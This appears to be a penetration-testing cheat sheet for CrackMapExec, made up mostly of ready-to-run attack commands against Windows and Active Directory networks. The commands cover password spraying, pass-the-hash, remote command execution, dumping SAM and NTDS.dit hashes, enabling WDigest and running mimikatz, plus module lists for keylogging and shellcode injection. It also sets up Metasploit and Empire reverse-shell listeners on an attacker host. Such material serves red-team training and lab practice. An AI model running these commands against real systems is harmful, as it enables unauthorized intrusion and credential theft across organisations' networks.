
## CrackMapExec Cheat Sheet

```
# General help
crackmapexec --help

# Protocol help
cracmapexec smb --help


```

### Connexions & Spraying

```
# Target format
crackmapexec smb ms.evilcorp.org
crackmapexec smb 192.168.1.0 192.168.0.2
crackmapexec smb 192.168.1.0-28 10.0.0.1-67
crackmapexec smb 192.168.1.0/24
crackmapexec smb targets.txt

# Null session
crackmapexec smb 192.168.10.1 -u "" up ""

# Connect to target using local account
crackmapexec smb 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth

# Pass the hash against a subnet
crackmapexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth
crackmapexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'

# Bruteforcing and Password Spraying
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1"
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1" "password2"
crackmapexec smb 192.168.100.0/24 -u "admin1" "admin2" -p "P@ssword"
crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt

```

### Enumeration 

#### Users

```

# Enumerate users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --users

# Perform RID Bruteforce to get users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --rid-brute

	- Can also do this:
	- lookupsid.py flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb

# Enumerate domain groups
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --groups

# Enumerate local users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users

```

#### Hosts

```
# Generate a list of relayable hosts (SMB Signing disabled)
crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt

# Enumerate available shares
crackmapexec smb 192.168.215.138 -u 'user' -p 'PASSWORD' --local-auth --shares

# Get the active sessions
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions

# Check logged in users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers

# Get the password policy
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol

```

### Execution & Co

```
# CrackMapExec has 3 different command execution methods (in default order) :
# - wmiexec --> WMI
# - atexec --> scheduled task
# - smbexec --> creating and running a service

# Execute command through cmd.exe (admin privileges required)
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x 'whoami'

# Force the smbexec method
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec

# Execute commands through PowerShell (admin privileges required)
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X 'whoami'


```

### Getting Credentials

```
# Dump local SAM hashes
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam

# Enable or disable WDigest to get credentials from the LSA Memory
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable

# Then you juste have to wait the user logoff and logon again
# But you can force the logoff
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'quser'
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'logoff <sessionid>'

# Dump the NTDS.dit from DC using methods from secretsdump.py

# Uses drsuapi RPC interface create a handle, trigger replication
# and combined with additional drsuapi calls to convert the resultant 
# linked-lists into readable format
crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds

# Uses the Volume Shadow copy Service
crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss

# Dump the NTDS.dit password history
smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history


```

### Using the database

```
# The database automatically store every hosts reaches by CME and all credentials with admin access
cmedb

# Using workspaces
cmedb> workspace create test
cmedb> workspace test

# Access a protocol database and switch back
cmedb (test)> proto smb
cmedb (test)> back

# List stored hosts
cmedb> hosts

# View detailed infos for a specific machine (including creds)
cmedb> hosts <hostname>

# Get stored credentials
cmedb> creds

# Get credentials access for a specific account
cmedb> creds <username>

# Using credentials from the database
crackmapexec smb 192.168.100.1 -id <credsID>


```

### Modules

```
# List available modules
crackmapexec smb -L

# Module information
crackmapexec smb -M mimikatz --module-info

# View module options
crackmapexec smb -M mimikatz --options

# Mimikatz module
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -M mimikatz
crackmapexec smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'

[*] Get-ComputerDetails       Enumerates sysinfo
[*] bloodhound                Executes the BloodHound recon script on the target and retreives the results to the attackers\' machine
[*] empire_exec               Uses Empire\'s RESTful API to generate a launcher for the specified listener and executes it
[*] enum_avproducts           Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI
[*] enum_chrome               Decrypts saved Chrome passwords using Get-ChromeDump
[*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server
[*] get_keystrokes            Logs keys pressed, time and the active window
[*] get_netdomaincontroller   Enumerates all domain controllers
[*] get_netrdpsession         Enumerates all active RDP sessions
[*] get_timedscreenshot       Takes screenshots at a regular interval
[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
[*] invoke_sessiongopher      Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher
[*] invoke_vnc                Injects a VNC client in memory
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] mimikatz                  Dumps all logon credentials from memory
[*] mimikatz_enum_chrome      Decrypts saved Chrome passwords using Mimikatz
[*] mimikatz_enum_vault_creds Decrypts saved credentials in Windows Vault/Credential Manager
[*] mimikittenz               Executes Mimikittenz
[*] multirdp                  Patches terminal services in memory to allow multiple RDP users
[*] netripper                 Capture`\'s credentials by using API hooking
[*] pe_inject                 Downloads the specified DLL/EXE and injects it into memory
[*] rdp                       Enables/Disables RDP
[*] scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
[*] shellcode_inject          Downloads the specified raw shellcode and injects it into memory
[*] slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
[*] test_connection           Pings a host
[*] tokens                    Enumerates available tokens
[*] uac                       Checks UAC status
[*] wdigest                   Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module



```


### Getting shells 

#### Metasploit

```
# First, set up a HTTP Reverse Handler
msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_https
msf exploit(handler) > set LHOST 192.168.10.3
msf exploit(handler) > set exitonsession false
msf exploit(handler) > exploit -j

# Met_Inject module
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M met_inject -o LHOST=YOURIP LPORT=4444 

```

#### Empire

```
# Start RESTful API
empire --rest --user empireadmin --pass gH25Iv1K68@^

# First setup an Empire HTTP listener
(Empire: listeners) > set Name test
(Empire: listeners) > set Host 192.168.10.3
(Empire: listeners) > set Port 9090
(Empire: listeners) > set CertPath data/empire.pem
(Empire: listeners) > run
(Empire: listeners) > list

# Start RESTful API
# The username and password that CME uses to authenticate to Empire's RESTful API 
# Are stored in the cme.conf file located at ~/.cme/cme.conf
empire --rest --user empireadmin --pass gH25Iv1K68@^

# Empire Module
crackmapexec smb 192.168.215.104 -u Administrator -p PASSWORD --local-auth -M empire_exec -o LISTENER=CMETest


```


### Additional Notes
[From Here](https://lisandre.com/cheat-sheets/crackmapexec)


## Help

```
crackmapexec -h
```

```
ldap ssh smb winrm mssql
```

## Fix errors

```
/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
  if result['type'] is not 'searchResEntry':
```

```
sudo nano /usr/lib/python3/dist-packages/pywerview/requester.py
```

```
        # Skip searchResRef
        for result in search_results: 
            ### MODIFIED TO FIX CRACKMAPEXEC !!! ###
            #if result['type'] is not 'searchResEntry':
            if result['type'] != 'searchResEntry':
```

## LDAP

#### Help

```
crackmapexec ldap -h
```

```
usage: crackmapexec ldap [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-k] [--export EXPORT [EXPORT ...]]
                         [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST] [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT] [-M MODULE]
                         [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options] [--server {https,http}] [--server-host HOST] [--server-port PORT]
                         [--connectback-host CHOST] [-H HASH [HASH ...]] [--no-bruteforce] [--continue-on-success] [--port {636,389}]
                         [-d DOMAIN | --local-auth] [--asreproast ASREPROAST] [--kerberoasting KERBEROASTING] [--trusted-for-delegation]
                         [--password-not-required] [--admin-count] [--users] [--groups]
                         [target ...]
```

#### List modules

`Use “-M <modulename>”.`

```
crackmapexec ldap -L
```

```
[*] MAQ                       Retrieves the MachineAccountQuota domain-level attribute
[*] adcs                      Find PKI Enrollment Services in Active Directory and Certificate Templates Names
[*] get-desc-users            Get description of the users. May contained password
[*] laps                      Retrieves the LAPS passwords
[*] ldap-signing              Check whether LDAP signing is required
[*] subnets                   Retrieves the different Sites and Subnets of an Active Directory
[*] user-desc                 Get user descriptions stored in Active Directory
```

```
crackmapexec ldap -M get-desc-users --options
```

#### Use modules

```
crackmapexec ldap -M ldap-signing $IP
```

Filter not tested, see filters from [ldapsearch](https://lisandre.com/cheat-sheets/ldapsearch)?

```
crackmapexec ldap $IP -u user -p password -d example.com -M get-desc-users -o FILTER="user"
```

#### Use Kerberos tickets

```
-k, --kerberos        Use Kerberos authentication from ccache file (KRB5CCNAME)
```

```
export KRB5CCNAME=baduser.ccache
crackmapexec ldap -k $IP
```

#### Retrieve the different Sites and Subnets of an Active Directory

```
crackmapexec ldap $DC_IP -u $USER -d $DOMAIN -p $PASS -M subnets
```

## Samba

Get machine name, domain and OS.

```
crackmapexec smb $IP
```

–no-bruteforce No spray when using file for username and password (user1 => password1, user2 => password2

```
WL=/usr/share/seclists/Passwords/Common-Credentials/best1050.txt
```

```
crackmapexec smb $IP -u samaccount.name -p "SomePass" --no-bruteforce --continue-on-success
```

```
crackmapexec smb $IP -u Administrator -p $WL --no-bruteforce --continue-on-success
```

```
crackmapexec smb $IP -u users.txt -H hashes.txt --no-bruteforce --continue-on-success
```

#### Enumerate shares and access on a network

```
crackmapexec smb x.x.x.0/24 -u $USER -p $PASS -d $DOMAIN --shares
```

#### Search for pattern in folders and filenames (NOT in file content)

```
crackmapexec smb $IP -u $USER -p $PASS --spider C\$ --pattern passw user admin account network login cred mdp motdepass
```

#### Search for pattern in folders, filenames and file content

❗ Be careful, can be long and verbose.

```
crackmapexec smb $IP -u $USER -p $PASS --spider C\$ --content --pattern passw user admin account network login cred mdp motdepass
```

### Test on Kali

To test is in Kali Linux, start a SMB server using [impacket-smbserver](https://lisandre.com/cheat-sheets/impacket).

```
sudo impacket-smbserver myshare /home/kali/share
```

```
crackmapexec smb $KALI_IP -u "" -p "" --spider MYSHARE --pattern rev
```

### Check if vulnerable to Zerologon

See [Zerologon (CVE-2020-1472)](https://lisandre.com/archives/14978).

```
crackmapexec smb $IP -u $USER -p $PASS -d example.com -M zerologon
```

## SSH

```
crackmapexec ssh $IP
```

## WinRM

Check if hashes are valid. File hash.txt contains all hashes LM:NTLM

users

```
Alice
Bob
```

hashes.txt

```
LM:NTLM
LM:NTLM
```

```
crackmapexec winrm $IP -u users -H hashes.txt

or w/password with and without --local-auth

crackmapexec winrm $ip -u users -p passwords --local-auth
crackmapexec winrm $ip -u users -p passwords
```

–no-bruteforce No spray when using file for username and password (user1 => password1, user2 => password2

```
crackmapexec winrm $IP -u users.txt -p passwords.txt --no-bruteforce
```